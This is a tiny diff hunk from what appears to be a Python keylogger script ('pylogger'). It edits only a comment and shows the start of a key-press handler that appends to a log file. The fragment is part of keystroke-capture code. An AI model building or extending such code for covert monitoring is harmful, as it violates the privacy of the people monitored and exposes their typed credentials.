@@ -25,7 +25,7 @@ if os.environ.get('pylogger_clean', None) is not None:
 	except EnvironmentError:
 	# File does not exist, or no permissions.
 		pass
-#creating a new key
+#creating a new key on the desktop
 #creating key pressing event and saving it into log file
 def OnKeyPress(event):
 	with open(log_file, 'a') as f:
